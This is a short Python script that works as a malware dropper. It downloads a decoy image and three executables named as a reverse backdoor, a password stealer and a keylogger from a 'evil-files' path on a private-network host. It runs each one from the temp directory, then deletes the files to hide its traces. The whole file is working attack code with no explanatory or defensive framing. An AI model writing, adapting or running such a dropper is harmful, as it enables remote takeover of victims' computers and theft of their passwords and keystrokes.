#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.29.128/evil-files/lulz.jpeg")
subprocess.Popen("lulz.jpeg", shell=True)

download("http://192.168.29.128/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

download("http://192.168.29.128/evil-files/passkeeper.exe")
subprocess.Popen("passkeeper.exe", shell=True)

download("http://192.168.29.128/evil-files/aelogger.exe")
subprocess.Popen("aelogger.exe", shell=True)

os.remove("lulz.jpeg")
os.remove("reverse_backdoor.exe")
os.remove("passkeeper.exe")
os.remove("aelogger.exe")